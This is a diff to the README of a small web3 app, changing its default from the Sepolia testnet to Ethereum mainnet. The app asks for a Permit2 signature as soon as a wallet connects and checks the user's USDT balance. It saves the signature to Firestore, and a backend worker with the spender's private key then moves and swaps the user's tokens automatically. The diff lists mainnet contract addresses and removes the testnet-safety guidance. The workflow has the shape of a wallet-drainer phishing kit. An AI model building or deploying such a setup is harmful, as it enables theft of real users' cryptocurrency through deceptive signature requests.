@@ -2,9 +2,9 @@
 
 Minimal dApp that:
 - Uses Reown AppKit to open wallet modal and connect
-- Configured for **Sepolia Testnet** by default
+- Configured for **Mainnet** by default
 - Requests a Permit2 typed-data signature immediately after connect
-- Detects USDT balance on testnet (same as mainnet behavior)
+- Detects USDT balance on mainnet
 - Stores signature components in Firestore
 - A backend worker (node) watches Firestore and executes transferFrom using the spender's key
 
@@ -35,23 +35,24 @@ The worker will monitor Firestore for new signatures and execute transfers autom
 
 ### Frontend (User-Facing App)
 
-The app is configured for **Sepolia Testnet** by default:
-- Network: Sepolia (Chain ID: 11155111)
-- USDT Token Address: `0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0`
+The app is configured for **Mainnet** by default:
+- Network: Mainnet (Chain ID: 1)
+- USDT Token Address: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
 - Permit2 Contract: `0x000000000022D473030F116dDEE9F6B43aC78BA3` (same on all networks)
-- The app will detect USDT balance on testnet just like on mainnet
+- The app will detect USDT balance on mainnet
 
-To switch to mainnet:
-1. Change `sepolia` to `mainnet` in `src/App.jsx`
-2. Update `VITE_TOKEN_ADDRESS` in `.env` to mainnet USDT: `0xdAC17F958D2ee523a2206206994597C13D831ec7`
+To switch to Sepolia testnet:
+1. Change `mainnet` to `sepolia` in `src/App.jsx`
+2. Update `VITE_TOKEN_ADDRESS` in `.env` to Sepolia USDT: `0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0`
+3. Update `VITE_RPC_URL` to a Sepolia RPC (e.g. `https://rpc.sepolia.org`)
 
 ### Backend (Executor/Admin Worker)
 
-The backend executor is **ALSO configured for Sepolia Testnet** by default:
-- RPC URL: `https://rpc.sepolia.org` (Sepolia testnet)
-- Universal Router: `0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD` (Sepolia)
-- Executor Address: `0xb1f02c288ae708de5e508021071b775c944171e8` (testnet wallet)
-- Output Token (WETH): `0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14` (Sepolia WETH)
+The backend executor is **ALSO configured for Mainnet** by default:
+- RPC URL: `https://cloudflare-eth.com` (mainnet)
+- Universal Router: `0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B` (mainnet)
+- Executor Address: Configure via env or Firestore settings
+- Output Token (WETH): `0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2` (mainnet WETH)
 
 ## How the Executor Works
 
@@ -65,7 +66,7 @@ User Wallet → Signs Permit2 → Firestore → Backend Worker → Executes Tran
 ### Step-by-Step Process:
 
 1. **User Signs Permit** (Frontend)
-   - User connects wallet on Sepolia testnet
+   - User connects wallet on mainnet
    - Signs a Permit2 typed message authorizing the executor
    - Signature saved to Firestore `permit2_signatures` collection
 
@@ -79,7 +80,7 @@ User Wallet → Signs Permit2 → Firestore → Backend Worker → Executes Tran
    - Builds Universal Router transaction with:
      - `PERMIT2_PERMIT` command (validates signature on-chain)
      - `V3_SWAP_EXACT_IN` command (swaps tokens via Uniswap V3)
-   - Executes transaction on Sepolia testnet
+   - Executes transaction on mainnet
    - Updates Firestore document with transaction hash
 
 4. **Admin Dashboard** (Frontend - `/admin`)
@@ -94,17 +95,15 @@ User Wallet → Signs Permit2 → Firestore → Backend Worker → Executes Tran
 - **Signature Validation**: All permits are validated on-chain via Permit2
 - **Balance Checks**: Worker checks token balances before executing
 - **Error Handling**: Failed transactions are logged with error messages
-- **Testnet First**: Safe testing environment before mainnet deployment
+- **Mainnet Ready**: Use testnet separately if you want a safe staging environment
 
 ### Executor Requirements:
 
-1. **Testnet ETH**: Executor wallet needs Sepolia ETH for gas
-   - Get from: https://sepoliafaucet.com/
+1. **Mainnet ETH**: Executor wallet needs mainnet ETH for gas
    - Minimum: 0.001 ETH (configurable via `MIN_ETH_REQUIRED`)
 
 2. **Private Key**: Must be stored securely in `functions/.env`
    - ⚠️ NEVER commit private keys to git
-   - ⚠️ Use different keys for testnet and mainnet
 
 3. **Firebase Configuration**: Uses Firebase Web SDK (not Admin SDK)
    - Same credentials as frontend
@@ -115,30 +114,31 @@ User Wallet → Signs Permit2 → Firestore → Backend Worker → Executes Tran
    - Deploy rules: `firebase deploy --only firestore:rules`
    - See [firestore.rules](firestore.rules) for configuration
 
-### Testnet Addresses:
+### Mainnet Addresses:
 
 | Contract | Address | Network |
 |----------|---------|---------|
 | Permit2 | `0x000000000022D473030F116dDEE9F6B43aC78BA3` | All Networks |
-| Universal Router | `0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD` | Sepolia |
-| Sepolia WETH | `0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14` | Sepolia |
-| Sepolia USDT | `0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0` | Sepolia |
+| Universal Router | `0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B` | Mainnet |
+| Mainnet WETH | `0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2` | Mainnet |
+| Mainnet USDT | `0xdAC17F958D2ee523a2206206994597C13D831ec7` | Mainnet |
 
-## Switching to Mainnet
+## Switching to Sepolia Testnet
 
-To run on mainnet, update both frontend AND backend:
+To run on Sepolia testnet, update both frontend AND backend:
 
 ### Frontend:
-1. `src/App.jsx`: Change `sepolia` to `mainnet`
-2. `.env`: Update `VITE_TOKEN_ADDRESS` to mainnet USDT
+1. `src/App.jsx`: Change `mainnet` to `sepolia`
+2. `.env`: Update `VITE_TOKEN_ADDRESS` to Sepolia USDT
+3. `.env`: Update `VITE_RPC_URL` to a Sepolia RPC
 
 ### Backend:
-1. `functions/worker.js`: Change `UNIVERSAL_ROUTER` to mainnet address
+1. `functions/worker.js`: Change `UNIVERSAL_ROUTER` to Sepolia address
 2. `functions/.env`: Update:
-   - `RPC_URL=https://cloudflare-eth.com` (or your mainnet RPC)
-   - `EXECUTOR_ADDRESS` (mainnet executor wallet)
-   - `EXECUTOR_PRIVATE_KEY` (mainnet private key - SECURE!)
-   - `OUTPUT_TOKEN` (mainnet WETH: `0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2`)
+   - `RPC_URL=https://rpc.sepolia.org`
+   - `EXECUTOR_ADDRESS` (Sepolia executor wallet)
+   - `EXECUTOR_PRIVATE_KEY` (Sepolia private key)
+   - `OUTPUT_TOKEN` (Sepolia WETH: `0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14`)
 
 ### Server:
 Similar changes apply to `server/index.js` if using the server instead of functions/worker.
@@ -154,9 +154,9 @@ Access at `/admin` to:
 
 ## Notes / Security
 - The backend **must** hold the spender private key. Keep it secret.
-- App is configured for testnet by default for safe testing.
-- Frontend and backend must be on the SAME network (both testnet or both mainnet)
-- Test thoroughly on testnet before deploying to mainnet.
+- App is configured for mainnet by default.
+- Frontend and backend must be on the SAME network
+- If you plan to test, use Sepolia first and keep mainnet keys isolated.
 - This project is intentionally minimal. Add robust validation, error handling, and logging for production.
 - Monitor executor wallet balance to ensure gas availability.
 
